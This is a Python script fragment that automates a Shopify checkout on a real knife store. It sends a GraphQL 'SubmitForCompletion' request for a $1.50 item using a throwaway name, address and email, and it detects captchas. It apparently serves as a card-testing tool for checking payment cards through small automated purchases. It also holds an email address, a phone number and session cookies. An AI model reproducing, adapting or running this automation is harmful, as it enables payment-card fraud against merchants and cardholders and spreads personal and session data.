brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment ProposalMembershipsFragment on MembershipTerms{__typename...on FilledMembershipTerms{memberships{apply handle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{_singleInstance __typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}details{redemptionId sourceAmount{amount currencyCode __typename}destinationAmount{amount currencyCode __typename}redemptionType __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{id cvvSessionId paymentInstrumentAccessorId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt due{...on PaymentLineDueEvent{event __typename}...on PaymentLineDueTime{time __typename}__typename}paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}',
    'variables': {
        'input': {
            'sessionInput': {
                'sessionToken': x_checkout_one_session_token,
            },
            'queueToken': queue_token,
            'discounts': {
                'lines': [],
                'acceptUnexpectedDiscounts': True,
            },
            'delivery': {
                'deliveryLines': [
                    {
                        'destination': {
                            'streetAddress': {
                                'address1': '5th Park Ave S New York',
                                'city': 'New York',
                                'countryCode': 'US',
                                'postalCode': '10010',
                                'firstName': 'Camylle',
                                'lastName': 'Bogan',
                                'zoneCode': 'NY',
                                'phone': '12195154586',
                                'oneTimeUse': False,
                            },
                        },
                        'selectedDeliveryStrategy': {
                            'deliveryStrategyByHandle': {
                                'handle': '6a1c1836c48ae06e9b10ba44d9aec215-799098757f2064f8104d4c661f157e79',
                                'customDeliveryRate': False,
                            },
                            'options': {
                                'phone': '12195154586',
                            },
                        },
                        'targetMerchandiseLines': {
                            'lines': [
                                {
                                    'stableId': stable_id,
                                },
                            ],
                        },
                        'deliveryMethodTypes': [
                            'SHIPPING',
                        ],
                        'expectedTotalPrice': {
                            'value': {
                                'amount': '0.00',
                                'currencyCode': 'USD',
                            },
                        },
                        'destinationChanged': False,
                    },
                ],
                'noDeliveryRequired': [],
                'useProgressiveRates': False,
                'prefetchShippingRatesStrategy': None,
                'supportsSplitShipping': True,
            },
            'deliveryExpectations': {
                'deliveryExpectationLines': [
                    {
                        'signedHandle': 'Oj+63PQkC4GvnBuljZQh3eBZF7xFTtu4ZW7/x9eh5EcKUeBUeT7MYQNffCl5EjU82oUR9VXyu8/yCWd/zoo3EMAvhczESFCiiX6TWB2DORXv8wCx8DsI8MrA9y9V0On140FD8pYR4AfCOoyl3cPVdlSH5YezkQ9no0V2EXGQodTcQKu6TkIpPwnr2Ft5L9iLZ6pujz92vMdRZ31eYtvCQmuCyZrbpnaigpuEU2kTSdOBE3IkgzxSOLFleKSdEntnWIpI1/cITIn5ozHiiQkAoHAXioYTmMOqgrYouO17FdBg08KVPfxzcoJO2DID2NEfIYKIdcxXI21P3G0N0xnCqcRSi3fzvsRipIga+du+wga1r5hG083uZ71CTKbJjHJLmr4aJQWV676G1IsBfcZgEYlRQAJhM4M6tAkxrtrSScZM7S4CiKI+r4bUrhUhdFctF/TQ/VQL7zMPxgRS7uaG377CHVoRWyrQPgQyKYfvoH6WojzyfNc9OKPsTF/tJN+tcJ4hXqf6K63PZG3BGgOiQ9prO+TQJdSXLp1bD79AalUyuL0i3dQNOXGiHLshqYu4fXeGhVv4wk3HEdThAEu/jd+M2GubLa+dO7uZuJrbDvla4qllPSfZJo9ePGEAe0Ix3DQ/2iQLsPX2Xg1C3a64NOOVIHMPyJzjrxkhq1OFVcdv3BoGMTzHiVbVDeptpUuXTq3loUco7YJSJXFohtiBwc6CNuiVfEQWqvK1my6QxbOtvDU00p2pxiAx6n/tIydwq6IO5DSDVUxHS8mKZitiaTKTJ/EUxsdX/xWrqza3/3qVP9SPLrOOmTCHQtUX1sJ219GT4teDmdJkocr40qWqZVIgL6mf0IQTqMDsyBDXJpfpQ0DVRir4z3gPGGktAp6FEjV0MuPC1xr1rrJroHTq+pTWyPxywxiHam5Ag0nYPy7GhS8NuZ69pd8UK3mZmpkwHEEXFp08mu/aqSczjeQ+nuBtz+dJf4MxJeBf/AKI9bnf9o+8u8BfkUZB6ANjLYD2ZYY0feoP8cU1ldhL3yCbc7ZtQd8nwFBjavMOvWa4CjSLBa8P/TM+iX26dfcczPLam8K5Y5Q/RshVR1JR9yZ1SnrPeEoXPuhPFsxaWM8W+CebbLTwPgGbwfaToKKyn/RG9CYsc1TfI9RjXD0mjlWly8QtsME6CsjmSlip8mw1cWNxMe/AztxHNy4ceEmVgvzjjafwCmGG3M/y1qXU+9ID3K9t8T9nPifqc9eXWVdjKe0QXg3GORtc+FuBCJRrX+0Nis44WDLjMB7kX38mrkYm9Ex3K/bJ4aCPqjkVyH7LQwKhudEz6iNnzjIr/Hfuubc00g3JNwCi3a5FAmSrf5kkquXofElIKFi8C68UOp5ogJ/RyTlqLzjewT2NOIrRWGgocuV3F9jfLLrHFhzZhdZqvEHjfp1ZPe3tjyY3gxj/6jJt/Mec4g==--H/TxXOlZ1UKG4DvL--ITY759kk5qFsfxfJf66Psw==',
                    },
                    {
                        'signedHandle': 'fujVwpM/pCzhzPjIWiW9AgRxrUjAGVWnkhUmMiSUfmFPnhTapeX8EBWPhyKDppZSCypIKwPYcVax/COGyEcd2biBsOkcPC2iiLm2dN+4zPjLXB4WnsLqYCOiHsKcJ++dhFZSHZJKxTtI4cY+93ZMxL5coZGqjs1yiGsDYC8ooybmFI01/v3NNVbktZfJrQfqL+bWaHUuLwj2pB6MyUpwkJqWcMjYc2XzBhkAT4JIN6JzKqCcZYILhHM/bEx+4+4JSjkNSDip7Leakbfd5pW3I4fojex/pEtdhUyoIBo0+NNOp/Sr4P+gl40U2RW6e5wx1VPfuwaT7OzlOHN6p+VobjAuG3qnQ9Dgs6eo4uIvapZmG93eBTMkr9EJ686BVvSuvauzNrWJoCiYC2rz6yI55Ya7xFurvu1Tthd3b2y632v6GbeYv0ZZn2DVo52kHegAwZrLAFqEvMV9nKBaqCBY3xUwkkdtv3dl37odOLj0sfFfHM7LBhkYXBt/JARORLp8qA4b6tQmAQMNTGqyu/l25uYqr2d6XLKkIrt3PoRiyAfmR+c9H+W84OoGWxjStt/Yhv5DqCBYavlDsR/vo6M/wCiWZQ+Uqd4cs+3xgp2Z7eKRYGecfsFQdTI8A082FoM9sKWeLx1C7dIp0u88G/lcruCPwxFKyCN91h9pNO9wqcJqsa6HwG8KJi3bxORf/zObaGW2HtIwwla6JPzaBqYwJvIdTudiKS5AtgKl2gXjlZ3X7nkuBJxHf4c67rXL8aiEZEFTvXcA+bvsnyG9jYcXE+xZpE6q9vnf8A2WGTx7+2aiIiijAvhzENmzhNg9/bRsSLxZTcN4SUO3oKILFW+OzE+lfApSYWpIJ0yg7qEy8/gwQD2kyMB8t+AZm2SNylrOSZyniHrr4YG3IqGX1tFuFaqSvrPY7QcHnAxY5ooMpBUqoosBWx/vOUAxGXWKW+AIbbtHoFdlQGIRt/bbIzmlwmydIRUh2rj1jUhC2+aN8WhhLo4epRL+7fRuLnXrB4s8dkyZuIo=--FiGfCipj+GyICdEx--4bqxEmkkbZHHkCdnshlxRA==',
                    },
                    {
                        'signedHandle': 'A9rDJ6eQ7UJu5B9wElFzPgQ4MkNdEWhD8xAvQIhgBhkpdD1/youtUxGS8d1+GB25DSmuaIm2AnhM1gN8MpfoZr5zV433Dmj3nrY4MAcVGxGN1qv2jfn4bFBMkYd0CN6T2Eow+8RHWBu47nuGJIyfgZAzI7uoFsyDBFCrA31HEdk4IHUxxniVGhM6Q9n6Lf6fBq2/IYZpNgNEWJDrSjPcS8g0rUUy+M+PUsVWPx+vh8Q7mwNBYuq/TX7z0/qqWd8Ojnnbixau0y7UjN+HbXTi/GZ6KmiBJtSJpO2ZRuRPVudVRnXc1q9rnMnVIzrN4QtEwjb9S+KfBtLZoSO29dwYja30YbJLLSTRLS55NQCo52ILfKHyuZHCdd4oRj0/MLe9FodKSJ3FbIgxxoy2EjYSPrpIAH1iTTVLnN9N9zgGGbsvwDBSDAirUfUU5YAF4pvDdE/7ykdn2pA6QpGKFcfbMRebjPSUg4Z1eLIWXmZkl2sMlIjTnUWg7iwgXOjfbADjnfJyzfAmrp4Q+Een8lI51r7ZYt23EDsMJm657hIjMMIlXB5Da0tw4Ekr9ZD+n9vcJOLFk0beLnrFyC8SxBjFqmsX2Q6gXvsDixoXugUm6UESYaKO2SUtbS2mr4iXOgJaJvK+PCOVryEZNLjpQbyW1K0vVRp0/vPHYjE+Os0c1FORz5mPGKCf8puiWM+7hUJFVRL57anJDHmvBlnv1Od5u0JIZ8mkaCY7ntqqkFOkBn4I3fiS0Wr/eBGpAG0R67+UPJeVkag8JpwrRO91MwHBwMNHu+gKY0yCUiqQTsUuhaRNcfbHMZO3L8JB3nVSqaUGKDcOr8Zowc6liwjK2/AQySdrFLq2pyDi9n4T243/HD7z1rBtSdPKsGNx/PvJ7t73NHjptIqb6d4jWyoHOQMQEgXe1p/AXDSeQoCI2udR9qhDxcxQgLz/jE+HWfNA00DUggRBK9r3J+V/g/FSVZxs96fepTLh6xTrMbQSWQA/ZI3eFTR7Ngme/KA6ok3qDdy+98EkMTJ7qHtv1ErQ9JtyosJM50RF1yjL0KxDAB6RRRncwMGmoWK0gSTjVhXtQDeDPd1jeUlevyAMOSPBWMYnHbk+QGxPMt6ycFT6/tZMou258fBUX74zLOElw0n8s/8/tgM6JUcdOp5HWRKOEqTcANgAU5X5lzidBdVRs70QNmjR4jZdy+LhUd5FBjYgzXbzylcVu44EshZmKWHaD+nTA1bN1PsHm6bpmYLV4oHKIjWLvBt4XQ/YDESH1WWCHuxWhvSs91dAsLn0jMCfe4cDT4rJMNjNTzvtf7zlT1SaFe437q1FM5Nuj/MqfjH7lR+RWCMFELu3A+tzugEtvrpSY3GpSdtdmSJprQD2M70uKfCwmMzwmeg25UBwW7+QnN80N5Y/T1mIs8VH2xBkHeoPgJiouNCIqbqJ91/3uJB9kU7PYKRzDQ==--xWIhU58+jailJqN1--2Pe7P6IEIISDq2e7MwHKHQ==',
                    },
                    {
                        'signedHandle': 'ioLFWOZUDoQFg2vvrVTvwdSaSzEyGuRx/uSMm/myDNfbjFKp/ycls8TcOZ79eurpdPpGDQgupSW6T5exulHBZZXcznoDfzMSzeh6kQUHv3NG6EFFwc93WdL6dLL7I88UySHixYP4cXULjCN98iW98HSlzcUGfd1QD0TIpIDCxSb85z5SYJKLFcuGSWRyJRAq+QEaStROYCD4Vz/KhwfKN3u/FvR636hz9EoxeSsdcVvyFulqnknzJNOI8AK09DriHcLlDHzJMXsxo8FTJr3yzDrYJReQA4vb4dnPxPim2QrCmT8Iv3m7lBcEvtzRL8vNwkhA0cQiDCYyW1KwJPrpkq4eX8rM4rybMwICvGd8Rqe3A19RucCHILU6twprz8En+txaY1WhXt3Py6DJuD8GjdY1XaGGkVSMwN8aijc5FuObhGO/MerdAOZheXcHb0f6efnNDQy6AZQe98aHCRSIEOQZjbnwgJatDy5tJaE98xG9ZjUavUiMdKmndIcXzzIkQ+qiXJlIQZi1tf+zLkw9PGQjO+GLxvgrIfO0OmftfpxzdT3hq20Mxl/Dy6eh2j8fukxBQijaFXsoJ8Q6mw75oXrsw0M4lr4uqdA/4q473IsiQOMWcakzUkBNAJAr3LuTJ130P4lYjKQfakItSyiALJojcQUD+31xIDRNkkQASTwkQnDlPBhqHraNDAezJolKWQaSTdZZkva1b4GXJezoVQ6S5eL8JMsNMTAYdoQX+CMbzrHIiYac5zkTBY1U4DMhs4ELTLhW1A0BbJLlud3huTmuwz/gW0+L+K33sW8FTT9kRaWX98+Jrx01lYeVmpooWzQXUEdTd1ZQgjqICOGsiuQKUdNe9bFEiM1jI5miEywQd49MYS5wNV3KNGWErmrp4M+7MSv9wVNeJf8kf01xlEi4XKaPx9d3jMvapWy7YoJ8gl6rsV6goi30GsoXve8TFl79whS4wZ5Mo6JmF0ASQ/SrZhXyUnBX3vAY9OMZ71rfp7THZ0UHCd7p5mvoVJ+BPDgYksk3ibeJBJYt5+Af2D9aQ67BOcpfheDHhiEKqAcsVQYu7pmxt90mB81EuxrlgGphwOeF355opAaKNO4T2wTKIa5TzB3FpD5njZe8g6zbjca83PmIwzgIRrKJbT/CFhDO7Pv4Y1HAbj1c8ThZlJGgoq92oYBQG5M/dAl3tbYZTU30Rzq7sIrZ3dGSQWiknWaH8y71ELD+f71BBvnv0JaNuzBWYTyacwSsqOvWmIWB4uh23k4J4o9jg/zejM++ultFZNAPi1n6HmOFNyAbCz1cuJ7DWNirFWOaNKoXPITrBQJOYphqpJRLmd7k49bIKEzn3U5fK01J0Bb7YxfRpbJG8s7vXyHtls/7wncizGKMrVuUNCI9KQ2MoTM9/PfM5int4Ai1RW7FtzgBO8B+gA4HoUejuZb0F+tj/dvFiJmfVSK4OQ==--7UdlPViBgw/ccqUZ--sZzpAbi0D0JcPViggf4VYg==',
                    },
                    {
                        'signedHandle': 'GVBwHJtqO0UycLBDiowYlb57Amjc8+ztSz1cPZrACkT/Kx7mWs/Ts3asEoiQxzRkk9AwKX4+D9d/eDfm0qCz4pzifjMy4EaeM6w0D7CN1AvA+QDxq8k0nF0Prr3jPdmataX9zTVBj3xPlyicmqJWLAT6J92/28s0vy23YCjNcqMHg+15Yp52b2ZfW01Rsnz2Xq0zsLpMU0zgZORgBdO85iu1Pu2ZfTMJ43AhkEHdw//7GWGGFm+IkcxBa2g2RwiYuLbAijzsIqIxH2Jnn6mHyZMlu8h24N9jtylBs7xydcoOwDprQABJ0yTzpGhdjI6C3bJ9/Q4XICcPVMt+gYb1OcneiEFuD8Ikjth/3nJFGWWu38b/7Th53uO0XLOgGU8YLAkZzLKvH8O/x+PXbaoQk5nVZsYfVuhPi6rwlm5QODYB00s0SkOOgUshKBgVgeeGKQNjJFUJkZj4XTMA49CfmjJ0EA+bW6EU/JcjPrseJPil+RA7oCD2Yd7Y+2JwGIBUc+c5IOMOpbBkZu7mYGU5cnU9mePWokKeRvRLyBpn0FhAjnH+RicjCKrFFEH30Bm+bvwtNYuBxN6YB6V8m2UBfIMo68SVQ4H7cXyNZh1Pulw9ZaK+/MPQCJF3d+2lZ4UIkzkLXisSJdIzXY1+SBbM2y+LKO/3pkxH06VeBVKB93iDGzWvfJZUt9RZge/WMyo9yxcH9SwmQ+eSCCJgNNxOKNXugRP//s+Clb9Hg6E2qDZd1O8QoKEtvj+3K8hoXlryGq/XpE9nb5ZtesfR7EBFdSbQawRPbhHogZn7LsuH4f5KPs5iDVXBcq1XhVNe6aZDiPcP6kPvmfCgLLSMGYvYHxBca9twGwNVBb3L5nY3zVLh5lXB1A21YYWXAgp/IAExugWJQ8wcN1hZ1mEhemjTTmBWo2S9uIneuXW12xz3kC1wXINEcMKXG5Ct3zzD4a0ywt5kY+0jCPhY9B6oQlEHCclRxTel+8PzXJnMEiTQcDk6G6sBhxE7V1RtpVVGPqfJWJpFXgM=--6PA3AIWo5okyKRh9--xjEvsbBRbRR7wlAE/CV4nA==',
                    },
                    {
                        'signedHandle': 'UnBjHViKwDnJzFrPV7uTREN6BvqBO1gtXIpqz76fYibruLjgws0CaoJW7VZ9/xKkNbF25WpS1da1UmVSHuE30tlEYzLUTtX/YE5X1dskIky0fmIXF2KdS+biWcR1jLFVIZbS46nZgrgAUCGzznOkYrodL3J0+qDDLllFL1NEeCv4Uy8VjABNsscckpAsXzzw73W+D8hA0JEfJwoFZNE2JRnsDgvMadPfLp6FERs04JBP8s7YHLGUtK+u2+OTLIeKiz7ZlkDu53H1C/S/lhFdQt2oJ2KFKuuRVKDAH2T9Bokvg02SP7W0kSyFn+EKBJxwcEf5UWNQS2FwEhXT4Om/nFhySAPahhQdyUq8b5BIOeXQmEDwrOIZFKcaReDH0CugpS930IlzEVpbl3dRogWDbySewvVCvEGQCdqP6T5F2CLz9Alo/gbs+gl8/il+mwUPGUlcSbTX5eLrXKTFyVa9G5wonupsH1m8sQoK+rmgTZqEr2K4aoNzWg66d9spo5QNqQw2C9JNP22c7sjF/9Ikz/MG3QXzNLhVbcgJw/7F2WIVVHMjvlyApdoErdREd8F2Nq4A4xE7IZvu+WGt53ODH9eHugmgBhv/7GpHk+xek31vJtfQR+Bj+VECvdEP5tcX+ESo4G3sVO4c2RFQYFwznGywxOdUvLr3/D55a6QvqHV2+s25Mf8bC9X9GMhQ4xKwnsaRF3KC2praI94koB5OfWFOIAXTUICK/xNL6Iu7Bj7yUNHiioDkvisOQ3SluMJtk4YFvSFGsV0hPj2DyTdYQWn9yECvyXS9yD1s13X5mI4WsflB80UGdQz9JXyLhTNFjcO+e+IC1Puwy7Tn7O0qVqCkS4e1eMRhyvgZNPp0dE5S2ct0FOGXZhDFAXhQm62qP5zprgAtUSy63UV3nj3KSgUB1LRQO9MD3yT19KsagJQAobaNqbfEg+Rem86ASCk1ZUZnNU/WJ24BoFL2GqvnaxFDb2qNqFvOi3n9xLcyQ331omy6goAe3QSRRqJIGO98oPn4o7U=--pqjkdM8q0aRC/vfJ--5QslPXel4ohNT5V9yP/wyw==',
                    },
                ],
            },
            'merchandise': {
                'merchandiseLines': [
                    {
                        'stableId': stable_id,
                        'merchandise': {
                            'productVariantReference': {
                                'id': 'gid://shopify/ProductVariantMerchandise/41696773669034',
                                'variantId': 'gid://shopify/ProductVariant/41696773669034',
                                'properties': [],
                                'sellingPlanId': None,
                                'sellingPlanDigest': None,
                            },
                        },
                        'quantity': {
                            'items': {
                                'value': 1,
                            },
                        },
                        'expectedTotalPrice': {
                            'value': {
                                'amount': '1.50',
                                'currencyCode': 'USD',
                            },
                        },
                        'lineComponentsSource': None,
                        'lineComponents': [],
                    },
                ],
            },
            'memberships': {
                'memberships': [],
            },
            'payment': {
                'totalAmount': {
                    'any': True,
                },
                'paymentLines': [
                    {
                        'paymentMethod': {
                            'directPaymentMethod': {
                                'paymentMethodIdentifier': paymentMethodIdentifier,
                                'sessionId': sessionid,
                                'billingAddress': {
                                    'streetAddress': {
                                        'address1': '5th Park Ave S New York',
                                        'city': 'New York',
                                        'countryCode': 'US',
                                        'postalCode': '10010',
                                        'firstName': 'Camylle',
                                        'lastName': 'Bogan',
                                        'zoneCode': 'NY',
                                        'phone': '12195154586',
                                    },
                                },
                                'cardSource': None,
                            },
                            'giftCardPaymentMethod': None,
                            'redeemablePaymentMethod': None,
                            'walletPaymentMethod': None,
                            'walletsPlatformPaymentMethod': None,
                            'localPaymentMethod': None,
                            'paymentOnDeliveryMethod': None,
                            'paymentOnDeliveryMethod2': None,
                            'manualPaymentMethod': None,
                            'customPaymentMethod': None,
                            'offsitePaymentMethod': None,
                            'customOnsitePaymentMethod': None,
                            'deferredPaymentMethod': None,
                            'customerCreditCardPaymentMethod': None,
                            'paypalBillingAgreementPaymentMethod': None,
                        },
                        'amount': {
                            'value': {
                                'amount': '1.5',
                                'currencyCode': 'USD',
                            },
                        },
                    },
                ],
                'billingAddress': {
                    'streetAddress': {
                        'address1': '5th Park Ave S New York',
                        'city': 'New York',
                        'countryCode': 'US',
                        'postalCode': '10010',
                        'firstName': 'Camylle',
                        'lastName': 'Bogan',
                        'zoneCode': 'NY',
                        'phone': '12195154586',
                    },
                },
            },
            'buyerIdentity': {
                'customer': {
                    'presentmentCurrency': 'USD',
                    'countryCode': 'US',
                },
                'email': 'indirmanu@gmail.com',
                'emailChanged': False,
                'phoneCountryCode': 'US',
                'marketingConsent': [
                    {
                        'email': {
                            'value': 'indirmanu@gmail.com',
                        },
                    },
                ],
                'shopPayOptInPhone': {
                    'number': '12195154586',
                    'countryCode': 'US',
                },
                'rememberMe': False,
            },
            'tip': {
                'tipLines': [],
            },
            'taxes': {
                'proposedAllocations': None,
                'proposedTotalAmount': {
                    'value': {
                        'amount': '0',
                        'currencyCode': 'USD',
                    },
                },
                'proposedTotalIncludedAmount': None,
                'proposedMixedStateTotalAmount': None,
                'proposedExemptions': [],
            },
            'note': {
                'message': None,
                'customAttributes': [],
            },
            'localizationExtension': {
                'fields': [],
            },
            'nonNegotiableTerms': None,
            'scriptFingerprint': {
                'signature': None,
                'signatureUuid': None,
                'lineItemScriptChanges': [],
                'paymentScriptChanges': [],
                'shippingScriptChanges': [],
            },
            'optionalDuties': {
                'buyerRefusesDuties': False,
            },
            'cartMetafields': [],
        },
        'attemptToken': f'{token}-bexsedx6gz8',
        'metafields': [],
        'analytics': {
            'requestUrl': f'https://shedknives.com/checkouts/cn/{token}?auto_redirect=false&edge_redirect=true&locale=en-IN&skip_shop_pay=true',
            'pageId': 'f1887ffb-56EB-4BE5-37FA-8B5A362EC12C',
        },
    },
    'operationName': 'SubmitForCompletion',
}

              request = await session.post(
                  'https://shedknives.com/checkouts/unstable/graphql',
                  params=params,
                  headers=headers,
                  json=json_data,
              )
              
              # print(request.text)
    
              if "CAPTCHA_METADATA_MISSING" in request.text:
                  return "Captcha Detected ! âš ï¸"
              bill=request.json()['data']['submitForCompletion']['receipt']['id']
              # print(bill)


              headers = {
                  'accept': 'application/json',
                  'accept-language': 'en-IN',
                  'content-type': 'application/json',
                  'origin': 'https://shedknives.com',
                  'priority': 'u=1, i',
                  'referer': 'https://shedknives.com/',
                  'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
                  'sec-ch-ua-mobile': '?0',
                  'sec-ch-ua-platform': '"Windows"',
                  'sec-fetch-dest': 'empty',
                  'sec-fetch-mode': 'cors',
                  'sec-fetch-site': 'same-origin',
                  'shopify-checkout-client': 'checkout-web/1.0',
                  'user-agent': user,
                  'x-checkout-one-session-token': x_checkout_one_session_token,
                  'x-checkout-web-build-id': '2cc80faca885ade9db1085b81b6b927c893b6162',
                  'x-checkout-web-deploy-stage': 'production',
                  'x-checkout-web-server-handling': 'fast',
                  'x-checkout-web-server-rendering': 'yes',
                  'x-checkout-web-source-id': token,
                  # 'cookie': 'secure_customer_sig=; localization=IN; cart_currency=INR; _shopify_y=137582F9-7f26-4960-b5db-2b0d67119e8d; _tracking_consent=%7B%22con%22%3A%7B%22CMP%22%3A%7B%22a%22%3A%22%22%2C%22m%22%3A%22%22%2C%22p%22%3A%22%22%2C%22s%22%3A%22%22%7D%7D%2C%22v%22%3A%222.1%22%2C%22region%22%3A%22INGJ%22%2C%22reg%22%3A%22%22%2C%22purposes%22%3A%7B%22a%22%3Atrue%2C%22p%22%3Atrue%2C%22m%22%3Atrue%2C%22t%22%3Atrue%7D%2C%22display_banner%22%3Afalse%2C%22sale_of_data_region%22%3Afalse%2C%22consent_id%22%3A%226BE6A551-868c-48FD-a7e2-b9ab490a7f62%22%7D; _orig_referrer=https%3A%2F%2Fbloodxteam.com%2F; _landing_page=%2Fproducts%2Fshed-knives-sticker-1; _shopify_sa_p=; shopify_pay_redirect=pending; soundestID=20250521062556-nK9cqF0t47q3ylxncY5L4i9uAeMaEFuNOhVVbrCSxwXSCmueD; omnisendSessionID=GFstRSazqCxHv9-20250521062556; _fbp=fb.1.1747808756921.239970416511492494; _pin_unauth=dWlkPU4ySmhOR0pqTnpBdE1ETXpZUzAwTlRFMExXRm1aV1V0TVRka1ltSXpNekkxTVRWag; _ga=GA1.1.1946165539.1747808757; omnisend-form-6797ef983f123c4f0ae5081d-closed-at=2025-05-21T06:26:03.175Z; cart=Z2NwLWFzaWEtc291dGhlYXN0MTowMUpWUlJBVks5Q1FQMFlCOTBCRUZIWjAyTQ%3Fkey%3D55a5573131047b431b6244ad6287eb98; omnisendShopifyCart={"41696773669034":1}; cart_sig=602181c0c91c05d6321ff19dc2aa9c0c; page-views=9; keep_alive=eyJ2IjoxLCJ0cyI6MTc0NzgwODk2NDMzNiwiZW52Ijp7IndkIjowLCJ1YSI6MSwiY3YiOjEsImJyIjoxfSwiYmh2Ijp7Im1hIjoxMSwiY2EiOjAsImthIjowLCJzYSI6MCwidCI6ODksIm5tIjoxLCJ2YyI6MH0sInNlcyI6eyJwIjoxMCwicyI6MTc0NzgwODc1NjMyMiwiZCI6MTk2fX0%3D; checkout_session_token__cn__Z2NwLWFzaWEtc291dGhlYXN0MTowMUpWUlJBVks5Q1FQMFlCOTBCRUZIWjAyTQ=%7B%22token%22%3A%22AAEB4KXOE6KZvnqLN9zGF7Zf3IbIoIo_UKumZI9fqVtHC2oOAL2G5ayUXIX2sFbiZq5YYB73Fyrc5xAKUT5-GerwGBQMw2-928wHTVTZcRlVzM0qBZTKEQlKXgw6_7fVEOosoqm9AAiOxklztiRDB6gTZldEPa9Gq3CvEdji_38gDbDoJFCc4MgCuzTLI51_64KmfE24vKuHCoG5yslgsNQpDWxMuJtBgvvsbuwQbdvnost_Ufr4MrWUCm8OBLP2nl4W_w%22%2C%22locale%22%3A%22en-IN%22%2C%22checkout_session_identifier%22%3A%226a1c1836c48ae06e9b10ba44d9aec215%22%7D; checkout_session_lookup=%7B%22version%22%3A1%2C%22keys%22%3A%5B%7B%22source_id%22%3A%22Z2NwLWFzaWEtc291dGhlYXN0MTowMUpWUlJBVks5Q1FQMFlCOTBCRUZIWjAyTQ%22%2C%22checkout_session_identifier%22%3A%226a1c1836c48ae06e9b10ba44d9aec215%22%2C%22source_type_abbrev%22%3A%22cn%22%2C%22updated_at%22%3A%222025-05-21T06%3A29%3A28.068Z%22%7D%5D%7D; shop_pay_accelerated=%7B%22universal_redirect%22%3A1747808968%7D; auth_state_01JVRRGR7CSXTAAYTG3JXH7GNJ=c2f7fcc95d12ac452f32729b14ebcd85; skip_shop_pay=false; _shopify_s=3F85DFA6-fefc-4B56-bc4d-a0a6cb13e275; omnisendContactID=682d72f05cbef8fabb3a2746; hide_shopify_pay_for_checkout=false; 